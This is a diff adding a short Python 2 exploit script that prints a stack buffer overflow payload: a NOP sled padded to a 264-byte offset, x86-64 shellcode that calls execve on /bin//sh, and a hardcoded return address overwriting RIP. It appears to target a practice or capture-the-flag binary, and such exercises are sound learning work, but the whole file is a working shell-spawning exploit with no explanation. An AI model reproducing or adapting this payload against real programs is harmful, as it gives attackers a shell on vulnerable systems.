@@ -1,0 +1,14 @@
+#!/usr/bin/python2
+
+offset = 264
+
+shellcode  = b""
+shellcode += b"\x6a\x3b\x58\x99\x52\x48\xbb\x2f"
+shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x53"
+shellcode += b"\x54\x5f\x52\x57\x54\x5e\x0f\x05"
+
+junk = b"\x90" * (offset - len(shellcode))
+
+rip = b"\xd0\xe5\xff\xff\xff\x7f"
+
+print(junk + shellcode + rip)
